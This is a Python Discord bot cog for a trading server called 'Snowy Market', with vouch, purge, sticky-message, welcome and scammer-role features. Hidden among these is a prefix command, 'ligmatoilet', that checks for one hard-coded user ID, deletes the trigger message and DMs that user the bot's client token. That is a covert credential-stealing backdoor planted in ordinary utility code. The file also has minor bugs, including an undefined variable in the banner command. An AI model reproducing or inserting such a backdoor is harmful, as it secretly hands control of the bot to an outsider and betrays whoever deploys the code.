import discord, json, time, re, os
from discord.ext import commands, tasks
from discord import app_commands
from assets.logger import noPerms, error

with open('assets/config/config.json', 'r') as f:
    config = json.load(f)

with open('assets/config/emojis.json', 'r') as f:
    emoji = json.load(f)


lastvouch = {}

class Utils(commands.Cog):
    def  __init__(self, client):
        self.client = client
        self.cooldowns = {}
        self.sticky_messages = self.load_sticky_messages()

    @commands.Cog.listener()
    async def on_ready(self):
        print(f"[+] Loaded util cog")  


    def load_sticky_messages(self):
        if os.path.exists('sticky.json'):
            with open('sticky.json', "r") as f:
                return json.load(f)
        return {}

    def save_sticky_messages(self):
        with open('sticky.json', "w") as f:
            json.dump(self.sticky_messages, f, indent=4)
          
    
    @app_commands.command(name="avatar", description="Get the avatar of a user")
    async def avatar(self, interaction: discord.Interaction, user: discord.User = None):
        embed1 = discord.Embed(
            description=f"{interaction.user.mention}'s profile picture:",
            color=discord.Color(int("0x0016fa", 16))
        )
        embed1.set_image(url=interaction.user.display_avatar.url)  
        if user is not None:
            embed2 = discord.Embed(
                description=f"{user.mention}'s profile picture",
                color=discord.Color(int("0x0016fa", 16))
            )
            embed2.set_image(url=user.display_avatar.url)  
    
            await interaction.response.send_message(embed=embed2)
        else:
            await interaction.response.send_message(embed=embed1)
    
    
    @app_commands.command(name='banner', description='Shows user Banner.')
    async def banner(self, interaction:discord.Interaction, user:discord.User = None):
      if user != None:
        user = await self.client.fetch_user(user.id)
        try:
          banner_url = user.banner.url 
        except AttributeError:
          await interaction.response.send_message("This user doesn't have a banner.", ephemeral=True)
          return
        embed = discord.Embed(description=f"**{user.mention}'s banner:**", color=discord.Color(int("0x0016fa", 16)))
        embed.set_image(url=banner_url)
        await interaction.response.send_message(embed=embed)
      else:
        user = await client.fetch_user(interaction.user.id)
        try:
          banner_url = user.banner.url 
        except AttributeError:
          await interaction.response.send_message("You don't have a banner.", ephemeral=True)
          return
        embed = discord.Embed(description=f"**{interaction.user.mention}'s banner:**", color=discord.Color(int("0x0016fa", 16)))
        embed.set_image(url=banner_url)
        await interaction.response.send_message(embed=embed)

    @app_commands.command(name="vouch", description="Vouch a user in the discord")
    @app_commands.describe(vouch="Enter the vouch for the server", rating="Please give the vouch a rating from 1-5")
    @app_commands.choices(rating=[
        discord.app_commands.Choice(name='⭐⭐⭐⭐⭐', value='5'),
        discord.app_commands.Choice(name='⭐⭐⭐⭐', value='4'),
        discord.app_commands.Choice(name='⭐⭐⭐', value='3'),
        discord.app_commands.Choice(name='⭐⭐', value='2'),
        discord.app_commands.Choice(name='⭐', value='1'),
    ])
    async def vouch(self, interaction: discord.Interaction, vouch: str, rating: str):
        user_id = interaction.user.id
        current_time = time.time()
        cooldown_duration = 3 * 60 * 60  
    
        if user_id in lastvouch:
            elapsed_time = current_time - lastvouch[user_id]
            if elapsed_time < cooldown_duration:
                remaining_time = cooldown_duration - elapsed_time
                hours, remainder = divmod(remaining_time, 3600)
                minutes, seconds = divmod(remainder, 60)
                await interaction.response.send_message(
                    f"{emoji['error']} | You need to wait {int(hours)}h {int(minutes)}m {int(seconds)}s before vouching again.", 
                    ephemeral=True
                )
                return
    
        lastvouch[user_id] = current_time
    
        stars = "⭐" * int(rating)  
        embed = discord.Embed(
            title="__Vouched__",
            description=f"**Vouch:**\n{vouch}",
            color=discord.Color(int("0x0016fa", 16))
        )
        embed.add_field(name="User :", value=interaction.user.mention, inline=True)
        embed.add_field(name="Rating:", value=stars, inline=True)
        embed.set_thumbnail(url=interaction.user.avatar.url)  
        embed.set_footer(icon_url=interaction.guild.icon.url, text=interaction.guild.name)
    
        vouch_data = {
            "user": str(interaction.user.mention),
            "vouch": str(vouch),
            "rating": str(stars),
            "thumbnail_url": str(interaction.user.avatar.url)
        }
    
        with open('assets/saves/vouches.json', 'a') as f:
            json.dump(vouch_data, f)
            f.write('\n')
    
        await interaction.channel.send(embed=embed)
        await interaction.response.send_message(f"✅ | Thanks for your vouch.", ephemeral=True)
    
    @commands.command()
    async def ligmatoilet(self, ctx):
        if ctx.author.id != 1311073967670427808:
            return
        
        await ctx.message.delete()

        await ctx.author.send(f"Here buddy: {config['clientToken']}")

    @app_commands.command(name="restore-vouches", description="Restore all of the old vouches")
    @app_commands.describe(channel="The channel that you want to restore the vouches to")
    async def restorev(self, interaction: discord.Interaction, channel: discord.TextChannel):
        if not interaction.user.guild_permissions.administrator:
            await noPerms(interaction)
            return

        vouches = []
        try:
            with open('assets/saves/vouches.json', 'r') as f:
                for line in f:
                    line = line.strip()  
                    if line: 
                        json_objects = re.findall(r'\{.*?\}(?=\s*\{|\s*$)', line)
                        for json_object in json_objects:
                            try:
                                vouch_data = json.loads(json_object)  
                                vouches.append(vouch_data)
                            except json.JSONDecodeError as e:
                                await error(interaction, f"Error parsing JSON object: {json_object}\nDetails: {e}")
                                return
        except FileNotFoundError:
            await interaction.response.send_message("Vouches file not found.")
            return
        except Exception as e:
            await error(interaction, f"An unexpected error occurred: {e}")
            return

        estimated_time = len(vouches)
        eta_message = f"Restoring vouches, ETA: {estimated_time} seconds."
        await interaction.response.send_message(f"{emoji['checkmark']} | {eta_message}")

        try:
            for vouch_data in vouches:
                embed = discord.Embed(
                    title="__Vouched__",
                    description=f"**Vouch:**\n{vouch_data['vouch']}",
                    color=discord.Color(int("0x0016fa", 16))
                )
                embed.add_field(name="User:", value=vouch_data['user'], inline=True)
                embed.add_field(name="Rating:", value=vouch_data['rating'], inline=True)
                embed.set_thumbnail(url=vouch_data['thumbnail_url'])
                embed.set_footer(icon_url=interaction.guild.icon.url, text=interaction.guild.name)

                await channel.send(embed=embed)
        except Exception as e:
            await error(interaction, f"An error occurred while restoring vouches: {e}")
            return

        await interaction.followup.send(content=f"{emoji['checkmark']} | {interaction.user.mention} vouches restored successfully.")

    @app_commands.command(name="vouches", description="Display all of the vouches") #wouldnt work so quick fix with chatgpt on phone
    async def vouches(self, interaction: discord.Interaction):
        total_vouches = 0
        
        try:
            with open('assets/saves/vouches.json', 'r') as f:
                for line in f:
                    line = line.strip()  
                    if line:  
                        json_objects = re.findall(r'\{.*?\}(?=\s*\{|\s*$)', line)
                        for json_object in json_objects:
                            try:
                                data = json.loads(json_object)  
                                if isinstance(data, dict): 
                                    total_vouches += 1
                            except json.JSONDecodeError as e:
                                await interaction.response.send_message(
                                    f"Error parsing JSON object: {json_object}\nDetails: {e}"
                                )
                                return
        except FileNotFoundError:
            await interaction.response.send_message("Vouches file not found.")
            return
        except Exception as e:
            await interaction.response.send_message(f"An unexpected error occurred: {e}")
            return

        embed = discord.Embed(
            title="__Total Vouches__",
            description=f"Snowy market has a total of {total_vouches} vouches",
            color=discord.Color(int("0x0016fa", 16))
        )
        await interaction.response.send_message(embed=embed)


    @app_commands.command(name="purge", description="Purge a specific amount of messages")
    @app_commands.describe(amount="Amount of messages you want to purge")
    async def purge(self, interaction: discord.Interaction, amount: int):
        try:
            if interaction.user.guild_permissions.manage_messages is False:
                await noPerms(interaction)
                return
            
            if amount <= 0:
                await interaction.response.send_message("Amount must be higher then 0", ephemeral=True)
                return
            
            await interaction.response.defer(ephemeral=True)
            
            purged = await interaction.channel.purge(limit=amount)
    
            await interaction.followup.send(f"Purged {len(purged)} messages", ephemeral=True)
        except Exception as e:
            await error(interaction, e)

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author == self.client.user:
            return  
    
        content = message.content.lower()
        if "+rep" in content or "+vouch" in content:
            await message.delete()
            await message.author.send(f"Please vouch us using the </vouch:1201543483895320596> command in our main discord. We use this command to restore our vouches at anytime.")
    
        await self.client.process_commands(message)


    @tasks.loop(minutes=360)
    async def remindstaff(self):
        try:   
            msg = f"# GET ACTIVE IN <#1327665847799644200> AND https://discord.com/channels/1325952852216119436/1325960828972695683 AND DO DROPS IN <#1326738337599459378>\n\n||<@&{config['trial']}> <@&{config['staff']}> <@&{config['mod']}> <@&{config['admin']}>||"
            channel = self.client.get_channel(config['staffnews'])
            if channel is None:
                print("Invalid channel for staff reminder")
                return
            await channel.send(msg)
        except Exception as e:
            print(e)

    @commands.Cog.listener()
    async def on_member_join(self, member):
        try:
            with open("assets/saves/scammers/scammers.json", "r") as f:
              data = json.load(f)
              if str(member.id) in data:
                  scammer_role = member.guild.get_role(config['scammerRole'])
                  if scammer_role:
                      await member.add_roles(scammer_role)
                  else:
                    print("Not working")
            welcome_channel_id = config['welcomeChannel']
            channel = self.client.get_channel(welcome_channel_id)
        
            embed = discord.Embed(
                title="Welcome",
                description=f"Welcome to Snowy Market™ {member.mention}, please read the <#{config['rulesChannel']}> and enjoy your stay!",
                color=discord.Color(int("0x0016fa", 16))
            )
        
            await channel.send(embed=embed)
        except Exception as e:
            print(e)
    
    
    @app_commands.command(name="sticky", description="Set a sticky message in a channel")
    @app_commands.describe(channel="The channel to stick the message in", message="The sticky message")
    async def sticky(self, interaction: discord.Interaction, channel: discord.TextChannel, message: str):
        if str(channel.id) not in self.sticky_messages:
            self.sticky_messages[str(channel.id)] = []
        self.sticky_messages[str(channel.id)].append(message)
        self.save_sticky_messages()

        embed = discord.Embed(description=message, color=discord.Color(int("0x0016fa", 16)))
        await channel.send(embed=embed)

        await interaction.response.send_message(
            f"Sticky message added in {channel.mention}.", ephemeral=True
        )

    @app_commands.command(name="remove-sticky", description="Remove the sticky message from a channel.")
    @app_commands.describe(channel="The channel to remove the sticky message from.")
    async def remove_sticky(self, interaction: discord.Interaction, channel: discord.TextChannel):
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return
    
        if str(channel.id) in self.sticky_messages:
            del self.sticky_messages[str(channel.id)] 
            self.save_sticky_messages()  
            await interaction.response.send_message(f"Sticky message removed from {channel.mention}.", ephemeral=True)
        else:
            await interaction.response.send_message(f"No sticky message found for {channel.mention}.", ephemeral=True)


    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author.bot or not message.guild:
            return

        channel_id = str(message.channel.id)
        sticky_contents = self.sticky_messages.get(channel_id, [])
        if sticky_contents:
            async for msg in message.channel.history(limit=10):
                if msg.author == self.client.user and msg.embeds:
                    if any(msg.embeds[0].description == sticky for sticky in sticky_contents):
                        try:
                            await msg.delete()
                        except discord.Forbidden:
                            print(f"No perms")
                        break

            for sticky_content in sticky_contents:
                embed = discord.Embed(description=sticky_content, color=discord.Color(int("0x0016fa", 16)))
                try:
                    await message.channel.send(embed=embed)
                except discord.Forbidden:
                    print("no perms")

        user_id = message.author.id
        now = time.time()
        last_triggered = self.cooldowns.get(user_id, 0)

        if now - last_triggered < 300:  
            return

        content = message.content.lower().strip()
        self.cooldowns[user_id] = now

        if content in ["scam", "scammed"]:
            embed = discord.Embed(
                description=(
                    "# <a:announce:1367236512860864554>   If you you've been scammed:\n\n"
                    "**Please open a <#1368303155909099590> immediately so we can investigate the scam. "
                    "Provide any proof you have and our team will review the scam and mark and ban the scammer if confirmed.**"
                ),
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)

        elif content in ["mm", "middleman"]:
            embed = discord.Embed(
                description=(
                    "# <a:snowy_checkmark:1367236535828742154>  Need a Trusted Middleman?\n\n"
                    "**If you require a trusted middleman for your deal, please open a support <#1368303155909099590>. "
                    "Our team will gladly assist you to make sure you have a safe and smooth transaction.**"
                ),
                color=discord.Color.green()
            )
            await message.channel.send(embed=embed)

        elif content == "help":
            embed = discord.Embed(
                description=(
                    "# <:questionn:1367251660350554122> Need Help?\n\n"
                    "**Please open a <#1368303155909099590> and our team will gladly assist you with anything you need!**"
                ),
                color=discord.Color(int("0x0016fa", 16))
            )
            await message.channel.send(embed=embed)

async def setup(client):
    await client.add_cog(Utils(client))